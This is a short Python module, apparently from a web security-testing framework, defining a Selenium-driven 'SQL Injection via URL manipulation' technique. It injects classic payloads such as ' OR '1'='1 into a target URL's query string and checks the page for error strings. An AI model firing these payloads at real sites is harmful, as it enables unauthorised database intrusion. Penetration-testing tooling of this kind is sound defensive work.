from selenium.webdriver.remote.webdriver import WebDriver

from ...core.ttp import TTP
from ...payloads.generators import StaticPayloadGenerator

class URLManipulation(TTP):
    def __init__(self, target_url: str):
        super().__init__(
            name="SQL Injection via URL manipulation", 
            description="simulate an sql Injection by manipulation of url queries")
        self.target_url = target_url
        self.payload_generator = StaticPayloadGenerator([
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR 1=1 --",
        ])

    def get_payloads(self):
        yield from self.payload_generator()


    def execute_step(self, driver: WebDriver, payload: str):
        driver.get(f"{self.target_url}?q={payload}")

    def verify_result(self, driver: WebDriver) -> bool:
        return "sql" in driver.page_source.lower() or \
               "source" in driver.page_source.lower()

